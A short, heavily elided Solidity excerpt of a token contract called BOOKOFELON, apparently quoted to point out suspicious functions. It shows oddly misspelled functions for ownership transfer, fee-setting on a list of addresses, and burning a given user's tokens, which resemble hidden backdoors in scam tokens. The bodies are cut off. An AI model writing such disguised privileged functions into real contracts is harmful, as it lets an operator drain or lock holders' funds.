...
abstract contract Ownable {
    ...
    function transferOwnershipketery(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract BOOKOFELON is Ownable {
    ...
    function Approrves(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burnliqkiels(address user) public {
